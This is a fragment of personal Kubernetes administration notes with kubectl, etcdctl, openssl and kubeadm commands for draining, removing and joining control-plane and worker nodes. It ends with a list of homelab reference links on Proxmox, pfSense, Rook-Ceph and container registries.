```
kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data

kubectl delete node <node-name>

//Remove etcd master node 
kubectl exec -n kube-system etcd-k8s-test-master-1db4 -it -- etcdctl --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key --cacert="/etc/kubernetes/pki/etcd/ca.crt" member list
kubectl exec -n kube-system etcd-k8s-test-master-1db4 -it -- etcdctl --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key --cacert="/etc/kubernetes/pki/etcd/ca.crt" member remove <id>

//for the --token ( runned on some master node) expires after 24h
kubeadm token create

//for the discovery-token-ca-cert-hash (runned on some master node)
openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2>/dev/null | \
   openssl dgst -sha256 -hex | sed 's/^.* //' 
 

Master Node join
kubeadm join k8s.internal.example.cloud:6443 --token <token> \
--discovery-token-ca-cert-hash sha256:<discovery-token-ca-cert-hash> \
--control-plane --certificate-key <cerrificate key>
 

Worker Node Join
kubeadm join k8s.internal.example.cloud:6443 --token lsyfux.r8u8yba4ourszixz \
--discovery-token-ca-cert-hash sha256:<discovery-token-ca-cert-hash>

```

### References (HOWTOS):
- https://github.com/toboshii/home-cluster
- https://advanxer.com/blog/2019/12/pfsense-enabling-administration-via-the-wan-interface/
- https://docs.netgate.com/pfsense/en/latest/recipes/virtualize-proxmox-ve.html
- https://salmonsec.com/blogs/home_lab_5
- https://www.opensourceagenda.com/projects/hetzner-proxmox-pfsense
- https://medium.com/@liamcs98/functional-proxmox-homelab-framework-1bc7a68cc559
- https://registry.terraform.io/providers/Telmate/proxmox/latest/docs/guides/cloud_init
- https://pve.proxmox.com/pve-docs/chapter-qm.html#_preparing_cloud_init_templates
- https://www.informaticar.net/how-to-setup-proxmox-cluster-ha/
- https://gist.github.com/aw/ce460c2100163c38734a83e09ac0439a
- https://computingforgeeks.com/how-to-deploy-rook-ceph-storage-on-kubernetes-cluster/
- https://medium.com/devops-configuration-experiences/installing-jfrog-container-registry-on-ubuntu-914706da2938
- https://www.jfrog.com/confluence/display/RTF4X/Getting+Started+with+Docker+and+Artifactory
- https://cloud.redhat.com/blog/top-open-source-kubernetes-security-tools-of-2021
- https://www.magalix.com/blog/kubernetes-patterns-the-service-discovery-pattern
- https://blog.scottlowe.org/2019/07/30/adding-a-name-to-kubernetes-api-server-certificate/
- https://devops.stackexchange.com/questions/9483/how-can-i-add-an-additional-ip-hostname-to-my-kubernetes-certificate
- https://medium.com/@metahertz/single-node-k3os-rook-ceph-howto-a50652f7133d
- https://rook.github.io/docs/rook/latest/Getting-Started/quickstart/
- https://goharbor.io/docs/2.5.0/install-config/download-installer/
- https://gist.githubusercontent.com/kacole2/95e83ac84fec950b1a70b0853d6594dc/raw/ad6d65d66134b3f40900fa30f5a884879c5ca5f9/harbor.sh
- https://www.magalix.com/blog/kubernetes-patterns-the-service-discovery-pattern
- https://computingforgeeks.com/how-to-deploy-rook-ceph-storage-on-kubernetes-cluster/

